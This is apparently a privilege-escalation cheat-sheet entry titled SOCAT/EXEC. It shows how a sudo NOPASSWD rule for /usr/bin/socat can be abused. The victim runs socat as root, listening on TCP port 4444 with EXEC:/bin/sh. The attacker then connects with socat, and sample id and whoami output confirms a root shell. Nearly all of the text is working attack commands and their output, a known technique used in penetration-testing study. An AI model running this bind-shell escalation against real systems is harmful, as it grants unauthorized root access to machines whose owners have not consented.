# SOCAT

## EXEC
```
In this example, the victim machine allows: (root) NOPASSWD: /usr/bin/socat
On the victim: sudo /usr/bin/socat TCP4-LISTEN:4444,reuseaddr EXEC:/bin/sh
On the attacker: socat - TCP4:10.10.23.79:4444

id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

```